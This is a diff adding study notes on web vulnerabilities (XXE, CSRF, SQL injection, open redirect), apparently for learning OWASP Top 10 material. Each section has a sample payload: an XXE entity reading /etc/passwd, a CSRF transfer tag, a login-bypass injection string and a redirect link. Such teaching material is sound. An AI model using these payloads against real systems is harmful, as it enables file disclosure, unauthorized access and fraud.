@@ -7,11 +7,18 @@
     - [Stored XSS](#stored-xss)
     - [Payloads](#payloads)
     - [Solutions](#solutions)
-  - [XXE](#xxe)
-  - [CSRF](#csrf)
+  - [External Entity Injection (XXE)](#external-entity-injection-xxe)
+    - [Examples](#examples-1)
+    - [Payloads](#payloads-1)
+  - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
+    - [Examples](#examples-2)
+    - [Payloads](#payloads-2)
   - [SQL Injection](#sql-injection)
+    - [Examples](#examples-3)
+    - [Payloads](#payloads-3)
   - [Open Redirect](#open-redirect)
-  - [RCE](#rce)
+    - [Examples](#examples-4)
+    - [Payloads](#payloads-4)
   - [References](#references)
 
 ## Cross-Site Scripting (XSS)
@@ -48,17 +55,71 @@ Sanitize user input
 
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 
-## XXE
+## External Entity Injection (XXE)
 
-## CSRF
+Injection of XML external entities into web pages, which can be used to read files on the server and perform Server-Side Request Forgery (SSRF)
+
+### Examples
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<stockCheck>
+<productId>&xxe;</productId>
+</stockCheck>
+```
+
+### Payloads
+
+[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
+
+## Cross-Site Request Forgery (CSRF)
+
+A malicious website can trick a user into visiting a malicious website. The malicious website then sends a request to the vulnerable website. The vulnerable website then executes the request. It's not persistent, it's just a one-time attack.
+
+### Examples
+
+```html
+<img src="http://vulnerable-website.com/transfer?to=attacker&amount=1000000" />
+```
+
+### Payloads
+
+[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md)
 
 ## SQL Injection
 
+Modification of SQL queries to bypass authentication or retrieve data from the database
+
+### Examples
+
+Sending the following request to a login page
+
+```http
+username=admin' OR '1'='1'&password=123
+```
+
+### Payloads
+
+[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
+
 ## Open Redirect
 
-## RCE
+Redirecting a user to a malicious website
+
+### Examples
+
+```html
+<a href="http://vulnerable-website.com/redirect?url=http://malicious-website.com">Click here</a>
+```
+
+### Payloads
+
+[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md)
 
 ## References
 
 - [OWASP](https://owasp.org/)
 - [TryHackMe - Owasp Top 10](https://tryhackme.com/room/owasptop10)
+- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
